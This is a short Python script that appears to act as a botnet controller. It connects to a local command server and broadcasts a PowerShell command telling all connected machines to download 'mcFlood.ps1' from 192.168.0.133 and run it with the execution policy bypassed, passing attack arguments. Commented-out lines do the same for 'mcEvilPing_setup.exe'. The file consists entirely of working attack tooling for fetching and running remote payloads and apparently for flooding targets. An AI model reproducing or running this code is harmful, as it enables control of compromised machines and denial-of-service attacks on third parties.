import socket
import sys
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1",7676))

script = """
if(Test-Path 'C:\mcFlood.ps1'){
Start-Process -FilePath 'powershell' -ArgumentList '-executionpolicy bypass C:\mcFlood.ps1 """+sys.argv[1]+""" """+sys.argv[2]+""" """+sys.argv[3]+"""';
}else{
(New-Object Net.WebClient).DownloadFile('http://192.168.0.133/mcFlood.ps1', 'C:\\mcFlood.ps1');
Start-Process -FilePath 'powershell' -ArgumentList '-executionpolicy bypass C:\mcFlood.ps1 """+sys.argv[1]+""" """+sys.argv[2]+""" """+sys.argv[3]+"""';
}
"""
command = f"/sendTAll \"{script}\" \n"
s.send(bytes(command, 'utf-8') )
#downloadFile = "Invoke-WebRequest -Uri http:\\\\192.168.0.133\mcEvilPing_setup.exe -OutFile C:\\mcEvilPing_setup.exe;"
#s.send(b"/sendToAll \"if(Test-Path 'C:\mcEvilPing_setup.exe'){Start-Process -FilePath 'C:\mcEvilPing_setup.exe';}else{Invoke-WebRequest -Uri 'http://192.168.0.133/mcEvilPing_setup.exe' -OutFile 'C:\\mcEvilPing_setup.exe'; Start-Process -FilePath 'C:\mcEvilPing_setup.exe';}\"")
s.close()